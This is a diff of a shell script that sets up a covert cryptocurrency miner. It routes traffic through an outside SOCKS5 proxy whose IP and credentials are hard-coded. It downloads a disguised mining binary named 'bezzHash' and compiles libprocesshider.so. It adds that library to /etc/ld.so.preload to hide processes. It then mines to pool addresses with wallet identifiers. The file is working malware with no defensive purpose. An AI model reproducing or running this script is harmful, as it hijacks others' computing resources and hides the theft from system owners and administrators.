@@ -1,7 +1,5 @@
 #!/bin/sh
-
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-
 dpkg-reconfigure --frontend noninteractive tzdata
 
 apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
@@ -11,19 +9,11 @@ wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.g
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
-
-listen = :2233 
-
-loglevel = 1 
-
-socks5 = 127.0.0.1:1080 
-
-socks5_username = mikrotik999 
-
-socks5_password = Elibawnos
-
-select_proxy_mode = only_socks5
-
+listen = :2233
+loglevel = 1
+socks5 = 147.182.230.110:1080
+socks5_username = sikilnjaran
+socks5_password = Njejekatos
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -31,40 +21,28 @@ END
 sleep .2
 
 echo " "
-
 echo " "
 
 echo "**"
-
-./graftcp/local/graftcp-local
 
 ./graftcp/graftcp curl ifconfig.me
-./graftcp/graftcp go get -v golang.org/x/net/proxy
 
 echo " "
-
 echo " "
 
 echo "**"
 
 echo " "
-
 echo " "
 
-./graftcp/graftcp wget https://github.com/udumb4r4/script/raw/main/bezzHash
-
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-
 unzip magicBezzHash.zip
-
 make
-
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-
 mv libprocesshider.so /usr/local/lib/
-
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --algo ETHASH -p eth-eu1.hellominer.com:1100 --user 0x587bdded4037bba7c74fb6af2f6e296bb2f8415d.$(echo $(shuf -i 1-9999 -n 1)-itil)/maesdori@gmail.com
+./graftcp/graftcp ./bezzHash --url=ssl://nano_3otddbnyttuhkkx7dopz399df8eogmi4x5k3kobmpg3tjzyy18d1noh3skxe.$(echo $(shuf -i 1-9999 -n 1)-asu)@eth.2miners.com:12020 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
